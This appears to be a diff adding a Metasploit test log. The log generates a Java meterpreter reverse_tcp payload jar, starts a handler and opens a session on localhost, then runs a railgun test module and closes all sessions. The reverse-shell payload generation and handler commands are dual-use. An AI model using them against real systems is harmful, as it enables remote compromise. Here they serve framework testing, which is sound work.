@@ -1,0 +1,35 @@
+Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
+[4mmsf6[0m [0m> loadpath test/modules
+Loaded 39 modules:
+    14 auxiliary modules
+    13 exploit modules
+    12 post modules
+[4mmsf6[0m [0m> use java/meterpreter/reverse_tcp
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/javameterpreterreverse_tcp_session_tlv_logging20231026-4729-k2pm8ztxt
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> generate -o /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-java-meterpreter-reverse-tcp20231026-4729-im31xi.jar -f jar AutoVerifySessionTimeout=30 lport=6001 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/javameterpreterreverse_tcp_debug_log20231026-4729-wwd3gktxt spawn=0
+SessionTlvLogging => file:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/javameterpreterreverse_tcp_session_tlv_logging20231026-4729-k2pm8ztxt
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> [*] Writing 5259 bytes to /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-java-meterpreter-reverse-tcp20231026-4729-im31xi.jar...
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 0
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6001 
+[*] Sending stage (57692 bytes) to 127.0.0.1
+[*] Meterpreter session 1 opened (127.0.0.1:6001 -> 127.0.0.1:49776) at 2023-10-26 19:03:51 +0000
+use test/railgun_reverse_lookups
+[4mmsf6[0m post([1m[31mtest/railgun_reverse_lookups[0m) [0m> run session=1 AddEntropy=true Verbose=true
+[*] Running against session 1
+[*] Session type is meterpreter and platform is osx
+[*] SKIPPED: def test_windows_datastore (session platform is not windows)
+[*] SKIPPED: def test_osx_static (session does not support COMMAND_ID_STDAPI_RAILGUN_API)
+[*] SKIPPED: def test_linux_static (session platform is not osx)
+[*] SKIPPED: def test_windows_static (session platform is not windows)
+[*] Testing complete in 0.0 seconds
+[*] Passed: 4; Failed: 0; Skipped: 4
+[*] Post module execution completed
+sessions -K
+[4mmsf6[0m post([1m[31mtest/railgun_reverse_lookups[0m) [0m> jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 1 closed.
+[4mmsf6[0m post([1m[31mtest/railgun_reverse_lookups[0m) [0m> 
